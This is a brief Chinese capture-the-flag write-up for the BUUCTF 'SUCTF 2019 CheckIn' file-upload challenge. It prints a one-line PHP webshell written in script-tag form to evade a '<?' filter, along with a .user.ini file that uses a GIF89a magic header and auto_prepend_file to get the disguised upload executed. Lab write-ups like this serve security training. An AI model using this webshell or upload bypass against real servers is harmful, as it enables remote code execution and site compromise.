## BUUCTF - [SUCTF 2019]CheckIn

![image-20240828231124897](C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20240828231124897.png)

1. 上传`php`文件提示不行
2. 上传`png`文件提示 *<? in contents!*，于是修改木马

```html
<script language="php">eval($_GET['cmd']);</script>
```

3. 修改后缀提交之后发现 *exif_imagetype:not image!*



创建`.user.ini`文件

```ini
GIF89a
auto_prepend_file=muma.gif     
```

uploads/065831472858248584ff4993846d5065